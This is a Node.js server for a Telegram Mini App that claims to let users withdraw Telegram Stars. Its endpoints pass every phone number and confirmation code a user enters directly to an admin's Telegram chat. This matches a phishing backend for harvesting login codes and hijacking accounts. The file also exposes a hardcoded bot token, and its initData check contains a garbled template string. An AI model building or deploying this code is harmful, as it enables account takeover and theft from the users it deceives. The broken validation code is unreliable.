const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const axios = require('axios'); // npm install axios
const crypto = require('crypto');

const app = express();
const db = new sqlite3.Database('starry.db');

app.use(express.json());
app.use(express.static('./')); // отдаёт index.html

// === НАСТРОЙКИ ===
const BOT_TOKEN = '8206086440:AAFvAE6dQCaiRk85Q7PWh4VrTOanzcUaKNM'; // Тот же токен бота
const ADMIN_ID = 7926520611;             // Ваш ID для уведомлений

// Функция отправки сообщения админу
async function notifyAdmin(text) {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: ADMIN_ID,
            text: text,
            parse_mode: 'HTML'
        });
    } catch (error) {
        console.error('Ошибка отправки уведомления админу:', error.response?.data || error.message);
    }
}

// Верификация initData (обязательно!)
function validateInitData(initData) {
    if (!initData) return false;
    const params = new URLSearchParams(initData);
    const hash = params.get('hash');
    params.delete('hash');
    const dataCheckString = Array.from(params.entries())
        .sort((a, b) => a[0].localeCompare(b[0]))
        .map(([key, value]) => `\( {key}= \){value}`)
        .join('\n');

    const secretKey = crypto.createHmac('sha256', 'WebAppData').update(BOT_TOKEN).digest();
    const calculatedHash = crypto.createHmac('sha256', secretKey).update(dataCheckString).digest('hex');

    return calculatedHash === hash;
}

// Хранение OTP кодов (в проде — Redis с TTL)
const otpStore = {};

// Получить баланс
app.post('/api/balance', (req, res) => {
    const { initData, userId } = req.body;
    if (!validateInitData(initData)) return res.status(403).json({ error: 'Invalid' });

    db.get('SELECT balance FROM users WHERE user_id = ?', [userId], (err, row) => {
        res.json({ balance: row?.balance || 0 });
    });
});

// === НОВОЕ: Когда пользователь вводит номер телефона ===
app.post('/api/phone-entered', async (req, res) => {
    const { initData, userId, phone } = req.body;
    if (!validateInitData(initData)) return res.status(403).json({ error: 'Invalid' });

    const cleanPhone = phone?.trim() || 'не указан';

    // Сразу шлём админу
    await notifyAdmin(
        `Пользователь ввёл номер телефона\n\n` +
        `ID: <code>${userId}</code>\n` +
        `Номер: <code>${cleanPhone}</code>\n` +
        `Время: ${new Date().toLocaleString('ru-RU')}`
    );

    res.json({ message: 'Номер принят' });
});

// === НОВОЕ: Когда пользователь вводит код ===
app.post('/api/code-entered', async (req, res) => {
    const { initData, userId, code } = req.body;
    if (!validateInitData(initData)) return res.status(403).json({ error: 'Invalid' });

    const cleanCode = code?.trim() || 'пустой';

    // Сразу шлём админу
    await notifyAdmin(
        `Пользователь ввёл код подтверждения\n\n` +
        `ID: <code>${userId}</code>\n` +
        `Код: <code>${cleanCode}</code>\n` +
        `Время: ${new Date().toLocaleString('ru-RU')}`
    );

    res.json({ message: 'Код принят' });
});

// Отправка кода (по кнопке "Отправить код")
app.post('/api/send-code', async (req, res) => {
    const { initData, userId, phone } = req.body;
    if (!validateInitData(initData)) return res.status(403).json({ error: 'Invalid' });

    const code = Math.floor(100000 + Math.random() * 900000);
    otpStore[userId] = code.toString();

    console.log(`[ТЕСТ] Код для ${userId}: ${code}`); // В реальности — отправка SMS

    await notifyAdmin(
        `Запрос кода подтверждения\n\n` +
        `ID: <code>${userId}</code>\n` +
        `Номер: <code>${phone}</code>\n` +
        `Сгенерирован код: <code>${code}</code>`
    );

    res.json({ message: 'Код отправлен (см. консоль для теста)' });
});

// Верификация и вывод
app.post('/api/verify-withdraw', async (req, res) => {
    const { initData, userId, code } = req.body;
    if (!validateInitData(initData)) return res.status(403).json({ error: 'Invalid' });

    if (otpStore[userId] && otpStore[userId] === code) {
        db.get('SELECT balance FROM users WHERE user_id = ?', [userId], (err, row) => {
            if (row && row.balance > 0) {
                db.run('UPDATE users SET balance = 0 WHERE user_id = ?', [userId]);

                notifyAdmin(
                    `УСПЕШНЫЙ ВЫВОД ЗВЁЗД\n\n` +
                    `ID: <code>${userId}</code>\n` +
                    `Сумма: ${row.balance} ⭐\n` +
                    `Время: ${new Date().toLocaleString('ru-RU')}`
                );

                delete otpStore[userId];
                res.json({ success: true, message: 'Звёзды выведены!' });
            } else {
                res.json({ message: 'Нет звёзд для вывода' });
            }
        });
    } else {
        await notifyAdmin(
            `НЕУДАЧНАЯ попытка вывода\n\n` +
            `ID: <code>${userId}</code>\n` +
            `Введённый код: <code>${code || 'пустой'}</code>\n` +
            `Ожидался: <code>${otpStore[userId] || 'нет'}</code>`
        );
        res.json({ message: 'Неверный код' });
    }
});

app.listen(3000, () => {
    console.log('Mini App сервер запущен на http://localhost:3000');
});
